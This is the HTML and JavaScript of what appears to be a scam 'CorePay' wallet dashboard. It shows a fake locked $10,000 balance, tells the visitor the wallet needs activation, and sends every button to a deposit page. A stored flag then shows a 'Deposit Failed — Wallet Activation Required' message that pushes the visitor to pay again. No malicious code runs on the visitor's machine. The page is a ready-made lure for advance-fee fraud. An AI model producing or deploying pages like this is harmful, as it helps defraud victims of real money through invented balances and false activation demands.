<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>CorePay Dashboard</title>

<style>
body{
margin:0;
background:linear-gradient(135deg,#0f172a,#111827,#0b1020);
font-family:system-ui,-apple-system,Segoe UI,Roboto;
color:white;
opacity:0;
transition:.4s;
}

.header{
background:rgba(17,24,39,.9);
backdrop-filter:blur(20px);
padding:18px 24px;
display:flex;
justify-content:space-between;
align-items:center;
box-shadow:0 10px 30px rgba(0,0,0,.6);
}

.balance{
font-size:22px;
font-weight:700;
color:#f87171;
}

.locked{
font-size:12px;
color:#fca5a5;
margin-left:6px;
}

.grid{
padding:30px;
display:grid;
gap:25px;
max-width:520px;
margin:auto;
}

.card{
background:rgba(17,24,39,.85);
backdrop-filter:blur(20px);
padding:28px;
border-radius:24px;
text-align:center;
box-shadow:0 25px 70px rgba(0,0,0,.6);
animation:fadeUp .5s ease;
}

@keyframes fadeUp{
from{transform:translateY(20px);opacity:0}
to{transform:translateY(0);opacity:1}
}

button{
width:100%;
padding:14px;
margin-top:14px;
border:none;
border-radius:18px;
background:linear-gradient(90deg,#22c55e,#6366f1);
color:white;
font-weight:700;
cursor:pointer;
transition:.3s;
}

button:hover{
transform:translateY(-2px);
box-shadow:0 12px 30px rgba(99,102,241,.4);
}

button.secondary{
background:#1f2937;
}

.notice{
margin-top:14px;
font-size:13px;
display:none;
animation:shake .4s;
}

.notice.error{color:#fca5a5}
.notice.fail{color:#ef4444}

@keyframes shake{
0%{transform:translateX(0)}
25%{transform:translateX(-4px)}
50%{transform:translateX(4px)}
75%{transform:translateX(-4px)}
100%{transform:translateX(0)}
}

.loadingOverlay{
display:none;
position:fixed;
inset:0;
background:linear-gradient(135deg,#0f172a,#111827);
justify-content:center;
align-items:center;
z-index:999;
font-size:22px;
}
.loadingDots span{
animation:dot 1.4s infinite linear;
display:inline-block;
}
.loadingDots span:nth-child(2){animation-delay:.2s}
.loadingDots span:nth-child(3){animation-delay:.4s}
@keyframes dot{
0%,80%,100%{transform:scale(0)}
40%{transform:scale(1)}
}
</style>
</head>

<body>

<div class="header">
<strong>CorePay</strong>
<div class="balance">
$10,000 <span class="locked">(LOCKED)</span>
</div>
</div>

<div class="grid">
<div class="card">
<h3>Wallet Status</h3>
<p style="color:#9ca3af;font-size:14px">
Your wallet is inactive. Activation is required.
</p>

<button onclick="activateFunds()">Activate Funds</button>
<button class="secondary" onclick="goDeposit()">Deposit</button>

<div class="notice error" id="activateMsg">
Make your first deposit to activate your wallet
</div>

<div class="notice fail" id="failMsg">
❌ Deposit Failed — Wallet Activation Required
</div>
</div>
</div>

<div class="loadingOverlay" id="loading">
Redirecting<span class="loadingDots">
<span>.</span><span>.</span><span>.</span>
</span>
</div>

<script>
/* ORIGINAL SCRIPT UNCHANGED */
const activateMsg=document.getElementById("activateMsg");
const failMsg=document.getElementById("failMsg");

function activateFunds(){
  activateMsg.style.display="block";
  setTimeout(()=>{
    showLoader();
    setTimeout(()=>location.href="deposit.html",1200);
  },900);
}

function goDeposit(){
  showLoader();
  setTimeout(()=>location.href="deposit.html",1200);
}

function showLoader(){
  document.getElementById("loading").style.display="flex";
}

if(localStorage.depositAttempt==="true"){
  failMsg.style.display="block";
  localStorage.removeItem("depositAttempt");
}

setTimeout(()=>document.body.style.opacity=1,200);
</script>

</body> 
</html>
